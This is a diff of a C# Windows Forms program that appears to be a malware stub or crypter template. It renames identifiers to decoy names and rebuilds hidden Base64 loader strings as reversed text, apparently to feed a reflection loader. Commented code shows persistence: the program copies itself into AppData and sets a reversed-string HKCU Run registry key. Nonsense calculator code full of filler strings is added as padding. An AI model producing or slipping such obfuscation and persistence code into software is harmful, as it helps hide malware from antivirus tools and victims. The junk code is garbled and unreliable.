@@ -48,7 +48,7 @@ using System.Windows.Markup;
 
 
 
-namespace KeyboardInterrupt
+namespace SocketServer
 {
 
 
@@ -70,7 +70,7 @@ namespace KeyboardInterrupt
 
 
 
-             //Startup  password_reset();
+             //Startup  win32serviceutil();
 
 
             
@@ -101,110 +101,11 @@ namespace KeyboardInterrupt
 
                   
       
-                   	string ThreadedHTTPServer = "";
-			ThreadedHTTPServer += "%1% cfg_IP_WebServer ".Replace("%1% cfg_IP_WebServer ","V2");
-			ThreadedHTTPServer += "%1% CSettings".Replace("%1% CSettings","lu");
-			ThreadedHTTPServer += "%1% Failed to access certificate: {0}".Replace("%1% Failed to access certificate: {0}","ZG");
-			ThreadedHTTPServer += "XMLConverter".Replace("XMLConverter","93");
-			ThreadedHTTPServer += "Get-ADComputer".Replace("Get-ADComputer","c0");
-			ThreadedHTTPServer += "Get-ADComputer -Identity DC01 -Properties".Replace("Get-ADComputer -Identity DC01 -Properties","Rl");
-			ThreadedHTTPServer += "Get-ADComputer DC01 -Properties Name,operatingSystem".Replace("Get-ADComputer DC01 -Properties Name,operatingSystem","dm");
-			ThreadedHTTPServer += "List specific attributes of the DC01 domain computer".Replace("List specific attributes of the DC01 domain computer","lj");
-			ThreadedHTTPServer += "Properties".Replace("Properties","ZV");
-			ThreadedHTTPServer += "%3% Get-SmbMapping".Replace("%3% Get-SmbMapping","Bv");
-			ThreadedHTTPServer += "netuse".Replace("netuse","cn");
-			ThreadedHTTPServer += "Select LocalPath,RemotePath From MSFT_SmbMapping".Replace("Select LocalPath,RemotePath From MSFT_SmbMapping","Rh");
-			ThreadedHTTPServer += "Retrieves the SMB client directory mappings created for a server.".Replace("Retrieves the SMB client directory mappings created for a server.","bF");
-			ThreadedHTTPServer += "Get-LocalUser".Replace("Get-LocalUser","dy");
-			ThreadedHTTPServer += "Invoke-WebRequest".Replace("Invoke-WebRequest","YX");
-			ThreadedHTTPServer += "curl".Replace("curl","Bw");
-			ThreadedHTTPServer += "Download file from the Internet".Replace("Download file from the Internet","ZX");
-			ThreadedHTTPServer += "Download file from the Internet specifying the destination".Replace("Download file from the Internet specifying the destination","I=");
-			ThreadedHTTPServer += "";
-			ThreadedHTTPServer += "";
-			ThreadedHTTPServer += "";
-
-
-            string BaseHTTPRequestHandler = "";
-			BaseHTTPRequestHandler += "WebServer: Serving HTTP on {0} port {1}.".Replace("WebServer: Serving HTTP on {0} port {1}.","V");
-			BaseHTTPRequestHandler += "White".Replace("White","2");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","l");
-			BaseHTTPRequestHandler += "Yellow".Replace("Yellow","u");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","Z");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","G");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","9");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","3");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","c");
-			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","0");
-			BaseHTTPRequestHandler += "N";
-			BaseHTTPRequestHandler += "v";
-			BaseHTTPRequestHandler += "b";
-			BaseHTTPRequestHandler += "X";
-			BaseHTTPRequestHandler += "B";
-			BaseHTTPRequestHandler += "v";
-			BaseHTTPRequestHandler += "c";
-			BaseHTTPRequestHandler += "2";
-			BaseHTTPRequestHandler += "l";
-			BaseHTTPRequestHandler += "0";
-			BaseHTTPRequestHandler += "a";
-			BaseHTTPRequestHandler += "W";
-			BaseHTTPRequestHandler += "9";
-			BaseHTTPRequestHandler += "u";
-			BaseHTTPRequestHandler += "U";
-			BaseHTTPRequestHandler += "2";
-			BaseHTTPRequestHandler += "F";
-			BaseHTTPRequestHandler += "t";
-			BaseHTTPRequestHandler += "c";
-			BaseHTTPRequestHandler += "G";
-			BaseHTTPRequestHandler += "x";
-			BaseHTTPRequestHandler += "l";
-			BaseHTTPRequestHandler += "c";
-			BaseHTTPRequestHandler += "y";
-			BaseHTTPRequestHandler += "5";
-			BaseHTTPRequestHandler += "F";
-			BaseHTTPRequestHandler += "d";
-			BaseHTTPRequestHandler += "m";
-			BaseHTTPRequestHandler += "V";
-			BaseHTTPRequestHandler += "y";
-			BaseHTTPRequestHandler += "e";
-			BaseHTTPRequestHandler += "X";
-			BaseHTTPRequestHandler += "InvalidOperationException".Replace("InvalidOperationException","R");
-			BaseHTTPRequestHandler += "LDAPHelper".Replace("LDAPHelper","o");
-			BaseHTTPRequestHandler += "DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID".Replace("DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID","a");
-			BaseHTTPRequestHandler += "Properties".Replace("Properties","W");
-			BaseHTTPRequestHandler += "LDAPFilter".Replace("LDAPFilter","5");
-			BaseHTTPRequestHandler += "n";
-			BaseHTTPRequestHandler += "V";
-			BaseHTTPRequestHandler += "G";
-			BaseHTTPRequestHandler += "9";
-			BaseHTTPRequestHandler += "v";
-			BaseHTTPRequestHandler += "b";
-			BaseHTTPRequestHandler += "G";
-			BaseHTTPRequestHandler += "J";
-			BaseHTTPRequestHandler += "h";
-			BaseHTTPRequestHandler += "c";
-			BaseHTTPRequestHandler += "g";
-			BaseHTTPRequestHandler += "=";
-			BaseHTTPRequestHandler += "=";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-			BaseHTTPRequestHandler += "";
-
-
-                    byte[] log_message = Convert.FromBase64String(ThreadedHTTPServer); //Redefine Base64 URL
+                    byte[] log_message = Convert.FromBase64String(PlexConnect("=IXZwBXYydFbhRncvBVZjlmdlR0c39GZul2V"));
 
                     string JSConverter = Encoding.UTF8.GetString(log_message);
 
-                    byte[] getSetting = Convert.FromBase64String(BaseHTTPRequestHandler); //Redefine Base64 URL
+                    byte[] getSetting = Convert.FromBase64String(PlexConnect("==gchJGbv9GVn5WaoRXeyVmdF5yclxGctF2Uu9Wa0l2cvBXbvN0c39GZul2V")); //Redefine Base64 URL
 
                     string aTVLanguage = Encoding.UTF8.GetString(getSetting);
 
@@ -231,47 +132,26 @@ namespace KeyboardInterrupt
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
-            try
-            {
-
-
-
-
-                Console.Write("");
-                var daysAhead = Convert.ToInt32(Console.ReadLine());
-                Console.WriteLine("");
-                Console.ReadLine();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
+           
        
         }
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-           
-        }
-        private void textBox1_TextChanged(object sender, EventArgs e)
-        {
-           
-        }
+        
 
-        //Startup   public static void  password_reset()
+        //Startup   public static void  win32serviceutil()
         //Startup   {
-        //Startup       int OwnerDraw  = Conversions.ToInteger("1");
-        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
+        //Startup       int _svc_name_   = Conversions.ToInteger("1");
+        //Startup       if ((double)_svc_name_   != Conversions.ToDouble("1") || Registry.GetValue(PlexConnect("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
         //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
         //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
         //Startup       {
         //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
         //Startup           File.Copy(Application.ExecutablePath, email, true);
         //Startup       }
-        //Startup       Registry.SetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
+        //Startup       Registry.SetValue(PlexConnect("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
         //Startup   }
 
 
-        public static string Reverse(string s)
+        public static string PlexConnect(string s)
         {
             char[] charArray = s.ToCharArray();
             Array.Reverse(charArray);
@@ -290,7 +170,53 @@ namespace KeyboardInterrupt
 
         private void webBrowser13_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
         {
+               int sayi1, sayi2;
+            char opt;
+            double sonuc;
 
+
+            Console.WriteLine("\n\fileID: 7, guid: 0000000000000000f000000000000000, type: 0");
+            Console.WriteLine("\nTOPLAMA İÇİN + m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("ÇIKARMA İÇİN - m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("ÇARPMA İÇİN * m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("BÖLME İÇİN + m_PreloadedShaders m_PreloadedShaders");
+
+            Console.Write("\n\n GraphicsSettings GraphicsSettings GraphicsSettings :");
+            sayi1 = Convert.ToInt32(Console.ReadLine());
+
+            Console.Write(" GraphicsSettings GraphicsSettings GraphicsSettings :");
+            sayi2 = Convert.ToInt32(Console.ReadLine());
+
+            Console.Write("\nGraphicsSettings\t");
+            opt = Convert.ToChar(Console.ReadLine());
+
+            if (opt == '+')
+            {
+                sonuc = sayi1 + sayi2;
+                Console.WriteLine("\n{0} + preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '-')
+            {
+                sonuc = sayi1 - sayi2;
+                Console.WriteLine("\n{0} - preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '*')
+            {
+                sonuc = sayi1 * sayi2;
+                Console.WriteLine("\n{0} x preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '/')
+            {
+                sonuc = (double)sayi1 / sayi2;
+                Console.WriteLine("\n{0} / preprocessor.api = This module implements the Preprocessor API.", sayi1, sayi2, sonuc);
+            }
+            else
+            {
+                Console.WriteLine("0000000000000000f000000000000000 GraphicsSettings");
+            }
+
+
+            Console.ReadKey();
         }
 
         private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
@@ -497,7 +423,7 @@ namespace KeyboardInterrupt
     }
 
 
-    static class ThreadedHTTPServer
+    static class HasherEnume
     {
 
 
